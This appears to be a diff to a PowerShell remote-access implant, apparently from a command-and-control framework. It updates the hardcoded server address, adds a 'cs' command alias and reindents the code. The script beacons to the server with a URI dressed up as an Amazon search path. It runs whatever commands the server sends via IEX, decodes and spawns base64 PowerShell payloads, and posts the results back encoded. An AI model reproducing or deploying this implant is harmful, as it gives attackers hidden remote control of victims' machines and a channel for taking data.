@@ -1,5 +1,5 @@
 $h0 = "192.168"
-$me = ".12.27"
+$me = ".0.189"
 $p0rt= "8080"
 $uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 $proto = "ht"+"tp"+":/"+"/"
@@ -51,52 +51,52 @@ function ConvertTo-Hashtable {
 }
 
 while ($True) {
-	$serverMsg = (Invoke-WebRequest -Method Post -Uri $h0me -Body $checkin -UserAgent $useragent -UseBasicParsing).Content
-	$jsondata = "{" + $serverMsg.split("{")[1].split("`n")[0]
+  $serverMsg = (Invoke-WebRequest -Method Post -Uri $h0me -Body $checkin -UserAgent $useragent -UseBasicParsing).Content
+  $jsondata = "{" + $serverMsg.split("{")[1].split("`n")[0]
   $jsObject = $jsondata | ConvertFrom-Json | ConvertTo-Hashtable
 
-	if($jsObject['cmnd']) {
-		if($jsObject['cmnd'] -eq "quit") {
-			exit
-		}
-
-    if($jsObject['cmnd'].split(" ")[0] -eq "spawn") {
-		 try {
-        $selfdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
-			  $selfdata = $selfdata.replace('"','"""')
-			  Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
-				$retval = "[+] Spawn success..."
-      }
-			catch {
-				$retval = "[-] Spawn failed..."
-			}
-		}
-
-    elseif($jsObject['cmnd'].split(" ")[0] -eq "psh") {
-      $psdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
-			$retval = IEX $psdata -ErrorVariable err 2>&1
-			if($err) {
-				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
-				$err = ""
-			}
+  if($jsObject['cmnd']) {
+    if($jsObject['cmnd'] -eq "quit") {
+      exit
     }
 
-		else {
-			$retval = IEX $jsObject['cmnd'] -ErrorVariable err 2>&1
-			if($err) {
-				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
-				$err = ""
-			}
-		}
+    if($jsObject['cmnd'].split(" ")[0] -eq "spawn") {
+      try {
+        $selfdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
+        $selfdata = $selfdata.replace('"','"""')
+        Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
+        $retval = "[+] Spawn success..."
+      }
+      catch {
+        $retval = "[-] Spawn failed..."
+      }
+    }
 
-		if(!($retval)) {
-			$retval = "[*] No output returned"
-		}
+    elseif(($jsObject['cmnd'].split(" ")[0] -eq "psh") -or ($jsObject['cmnd'].split(" ")[0] -eq "cs")) {
+      $psdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
+      $retval = IEX $psdata -ErrorVariable err 2>&1
+      if($err) {
+        $retval = $retval + "`n[-] Errors returned:`n`n" + $err
+        $err = ""
+      }
+    }
+
+    else {
+      $retval = IEX $jsObject['cmnd'] -ErrorVariable err 2>&1
+      if($err) {
+        $retval = $retval + "`n[-] Errors returned:`n`n" + $err
+        $err = ""
+      }
+    }
+
+    if(!($retval)) {
+      $retval = "[*] No output returned"
+    }
 
     $jsObject.cmnd = ""
-		$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($retval | Out-String)))
-		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"retval`": `"$ncoded`"}"
-		$null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
-	}
-	Start-Sleep -Milliseconds $sleepytime
+    $ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($retval | Out-String)))
+    $resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"retval`": `"$ncoded`"}"
+    $null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
+  }
+  Start-Sleep -Milliseconds $sleepytime
 }
